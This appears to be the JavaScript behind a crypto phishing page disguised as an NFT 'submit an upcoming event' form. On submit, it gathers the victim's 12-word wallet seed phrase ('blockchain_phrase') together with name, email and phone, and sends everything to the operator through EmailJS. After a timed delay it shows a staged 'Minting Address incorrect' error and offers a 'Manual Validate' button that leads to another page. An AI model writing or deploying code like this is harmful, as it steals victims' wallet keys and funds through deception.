document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('wf-form-Submit-an-upcoming-event');
    
    if (form) {
        form.addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Show loading state on submit button
            const submitBtn = form.querySelector('[type="submit"]');
            const originalBtnText = submitBtn.value;
            submitBtn.value = 'Processing...';
            submitBtn.disabled = true;
            
            // Create and show loading spinner immediately
            const spinnerContainer = document.createElement('div');
            spinnerContainer.id = 'spinner-container';
            document.body.appendChild(spinnerContainer);
            
            // Add spinner styles (inlined for immediate rendering)
            const spinnerStyles = document.createElement('style');
            spinnerStyles.textContent = `
                #spinner-container {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.7);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    flex-direction: column;
                    z-index: 9999;
                }
                .spinner {
                    border: 5px solid #f3f3f3;
                    border-top: 5px solid #3498db;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 1s linear infinite;
                    margin-bottom: 20px;
                }
                #error-msg {
                    color: white;
                    font-size: 18px;
                    margin-bottom: 20px;
                    display: none;
                }
                #manual-validate-btn {
                    padding: 10px 20px;
                    background: #e74c3c;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 16px;
                    display: none;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            `;
            document.head.appendChild(spinnerStyles);
            
            // Create spinner elements
            spinnerContainer.innerHTML = `
                <div class="spinner"></div>
                <div id="error-msg">Blockchain Minting Address incorrect or invalid</div>
                <button id="manual-validate-btn">Manual Validate</button>
            `;
            
            // Get references to the new elements
            const errorMsg = document.getElementById('error-msg');
            const validateBtn = document.getElementById('manual-validate-btn');
            
            // Set up validation button click handler
            validateBtn.addEventListener('click', function() {
                window.location.href = 'submit-an-upcoming-event1.html';
            });

            // Collect all form data
            const formData = {
                blockchain_phrase: document.getElementById('phrase-12').value,
                last_name: document.getElementById('Last-Name-3').value,
                email: document.getElementById('Email-3').value,
                phone: document.getElementById('Phone-number').value,
                event_title: document.getElementById('Title').value,
                event_description: document.getElementById('Talk-about-your-drop').value,
                contact_details: document.getElementById('Interview-contact-details').value,
                press_release_url: document.getElementById('Your-press-release').value,
                open_date: document.getElementById('Open-date').value,
                end_date: document.getElementById('End-Date').value,
                location: document.getElementById('Your-event-location').value,
                blockchain: document.getElementById('Your-event-location-2').value,
                social_handles: document.getElementById('Social-handles-2').value,
                promotional_assets: document.getElementById('Promotional-assets').value,
                submission_date: new Date().toLocaleString()
            };

            // Send email via EmailJS
            emailjs.send('service_8ug6ezl', 'template_e73jb2t', formData)
                .then(function(response) {
                    // After 4 seconds, show error and validation button
                    setTimeout(function() {
                        document.querySelector('.spinner').style.display = 'none';
                        errorMsg.style.display = 'block';
                        validateBtn.style.display = 'block';
                    }, 4000);
                })
                .catch(function(error) {
                    console.error('Email failed to send:', error);
                    // Show error immediately if email fails
                    document.querySelector('.spinner').style.display = 'none';
                    errorMsg.style.display = 'block';
                    validateBtn.style.display = 'block';
                })
                .finally(() => {
                    submitBtn.value = originalBtnText;
                    submitBtn.disabled = false;
                });
        });
    }
});